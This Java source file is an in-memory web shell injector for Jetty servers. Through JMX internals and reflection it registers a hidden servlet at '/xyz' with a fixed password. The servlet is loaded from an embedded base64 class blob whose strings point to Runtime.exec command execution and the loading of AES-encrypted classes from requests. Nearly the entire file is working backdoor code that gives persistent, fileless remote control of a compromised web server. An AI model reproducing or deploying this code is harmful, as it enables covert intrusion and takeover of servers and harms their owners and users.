package com.memshell.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import sun.misc.BASE64Decoder;
import javax.management.ObjectName;
import javax.servlet.Servlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Set;

public class ServletBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 不管是这种方式拿到的 webAppContext 还是是通过 req.getServletContext() 拿到的 webAppContext
        // 他们的类加载器都是 startJarLoader，不同于 Thread.currentThread().getContextClassLoader()
        // 导致只能通过反射的方式完成整个步骤，否则就会抛 ClassNotFoundException 异常

        try{
            String servletName = "myServlet";
            String urlPattern = "/xyz";
            final String password = "xyz";

            JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

            Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Field modifier = field.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Repository repository = (Repository)field.get(obj);

            Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
            for(NamedObject namedObject : namedObjectSet){
                field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                field.setAccessible(true);
                modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                Object webAppContext = field.get(namedObject.getObject());

                field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                field.setAccessible(true);
                Object handler = field.get(webAppContext);

                field = handler.getClass().getDeclaredField("_servlets");
                field.setAccessible(true);
                Object[] objects = (Object[]) field.get(handler);

                boolean flag = false;
                for(Object o : objects){
                    field = o.getClass().getSuperclass().getDeclaredField("_name");
                    field.setAccessible(true);
                    String name = (String)field.get(o);
                    if(name.equals(servletName)){
                        flag = true;
                        break;
                    }
                }

                if(!flag){
                    System.out.println("[+] Add Dynamic Servlet");

                    ClassLoader classLoader = handler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                        Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                        holder = method.invoke(handler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                        holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }

                    holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);


                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    Class clazz;
                    try{
                        clazz = cl.loadClass("com.memshell.generic.DynamicServletTemplate");
                    }catch(ClassNotFoundException e){
                        BASE64Decoder base64Decoder = new BASE64Decoder();
                        String codeClass = "yv66vgAAADMBQwoAUwCQCQBSAJEKAJIAkwoAkgCUCACVCgBLAJYJAFIAlwcAmAoACgCZBwCaCACbBwCcBwBkCQCdAJ4KAAwAnwcAoAoADAChCACiBwCjCgATAJAKABMApAoApQCmCgCdAKcKAKUAqAcAqQoAGQCqBwCrCgAbAKoHAKwKAB0AqgoAUgCtCQCuAK8IALAKALEAsggAjAsAswC0CAC1CgC2ALcKALYAuAcAuQoAugC7CgC6ALwKAL0AvgoAKAC/CADACgAoAMEKACgAwgsAwwDECgDFALIIAMYHAMcKADMAkAgAyAoAMwDJCgDKAMsKADMAzAoAMwDNCADOCgC2AM8KALYA0AsAswDRCADSCwDTANQKAMUA1QgA1goA1wDYBwDZCwDTANoKALYA2woAQwDcCgDXAN0LALMA3goA3wDgCgDXAOEHAOIKAAwA4wgA5AcA5QcA5gcA5woAUACqBwDoBwDpAQAIcGFzc3dvcmQBABJMamF2YS9sYW5nL1N0cmluZzsBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAJleAEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABWNsYXp6AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAARjb2RlAQAFYnl0ZXMBAAJbQgEAAWUBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsBAAR0aGlzAQAtTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNTZXJ2bGV0VGVtcGxhdGU7AQANU3RhY2tNYXBUYWJsZQcA6AcA6gcA4gcAmAcAnAcA6wcAoAcAqQcAqwcArAEABmRvUG9zdAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAKRXhjZXB0aW9ucwEABWRvR2V0AQAGcmVzdWx0AQADY21kAQADa2V5AQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAlldmlsQ2xhc3MBAApldmlsT2JqZWN0AQASTGphdmEvbGFuZy9PYmplY3Q7AQAMdGFyZ2V0TWV0aG9kAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdHlwZQcA5wEAClNvdXJjZUZpbGUBABtEeW5hbWljU2VydmxldFRlbXBsYXRlLmphdmEMAFgA7AwAVABVBwDtDADuAO8MAPAA8QEAImNvbS5tZW1zaGVsbC5nZW5lcmljLk15Q2xhc3NMb2FkZXIMAPIA8wwAVgBXAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MAPQA9QEAEGphdmEvbGFuZy9PYmplY3QBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcA9gwA9wBXDAD4APkBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDAD6APUBAxB5djY2dmdBQUFETUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDUk1ZMjl0TDIxbGJYTm9aV3hzTDJkbGJtVnlhV012VFhsRGJHRnpjMHh2WVdSbGNqc0JBQUZqQVFBWFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUF0a1pXWnBibVZEYkdGemN3RUFMQ2hiUWt4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFGWW5sMFpYTUJBQUpiUWdFQUMyTnNZWE56VEc5aFpHVnlBUUFLVTI5MWNtTmxSbWxzWlFFQUVrMTVRMnhoYzNOTWIyRmtaWEl1YW1GMllRd0FCZ0FIQVFBaVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2d3QUR3QWFBUUFWYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeUFRQVhLRnRDU1VrcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQUlRQUNBQVVBQUFBQUFBSUFBQUFHQUFjQUFRQUlBQUFBT2dBQ0FBSUFBQUFHS2l1M0FBR3hBQUFBQWdBSkFBQUFCZ0FCQUFBQUJBQUtBQUFBRmdBQ0FBQUFCZ0FMQUF3QUFBQUFBQVlBRFFBT0FBRUFDUUFQQUJBQUFRQUlBQUFBUkFBRUFBSUFBQUFRdXdBQ1dTdTNBQU1xQXlxK3RnQUVzQUFBQUFJQUNRQUFBQVlBQVFBQUFBZ0FDZ0FBQUJZQUFnQUFBQkFBRVFBU0FBQUFBQUFRQUJNQURnQUJBQUVBRkFBQUFBSUFGUT09AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA+wD8BwDrDAD9AP4MAP8BAAwBAQECAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24MAQMA7AEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uDACAAHoHAQQMAQUBBgEAHlsrXSBEeW5hbWljIFNlcnZsZXQgc2F5cyBoZWxsbwcBBwwBCABZBwEJDAEKAQsBAAViYXNpYwcA6gwA5AEMDAENAQ4BABFqYXZhL3V0aWwvU2Nhbm5lcgcBDwwBEAERDAESARMHARQMARUBFgwAWAEXAQACXEEMARgBGQwBGgEbBwEcDAEdAR4HAR8BAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAEgASEHASIMASMBJAwBIAElDAEmARsBAAEtDAEnASgMASkBKgwBKwEsAQABdQcBLQwBLgEvDAEwAFkBAANBRVMHATEMATIBMwEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMATQBNQwBNgE3DABYATgMATkBOgwBOwE8BwE9DAE+ARsMAT8BQAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgwBQQFCAQAGZXF1YWxzAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAK2NvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNTZXJ2bGV0VGVtcGxhdGUBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABBqYXZhL2xhbmcvU3RyaW5nAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQADKClWAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANZ2V0U3VwZXJjbGFzcwEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmphdmEvdXRpbC9VVUlEAQAKcmFuZG9tVVVJRAEAEigpTGphdmEvdXRpbC9VVUlEOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAKZ2V0U2Vzc2lv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";
                        byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                        Method method = null;
                        Class clz = cl.getClass();
                        while(method == null && clz != Object.class ){
                            try{
                                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            }catch(NoSuchMethodException ex){
                                clz = clz.getSuperclass();
                            }
                        }
                        method.setAccessible(true);
                        clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                    }

                    holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, clazz.getDeclaredConstructor(String.class).newInstance(password));
                    handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);

//                    ServletMapping mappingx = new ServletMapping(Source.JAVAX_API);
//                    mappingx.setServletName(ServletHolder.this.getName());
//                    mappingx.setPathSpecs(urlPatterns);
//                    ServletHolder.this.getServletHandler().addServletMapping(mappingx);

                    clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                    Object servletMapping = null;
                    try{
                        servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                    }catch(NoSuchMethodException e){
                        servletMapping = clazz.newInstance();
                    }

                    servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                    servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                    handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
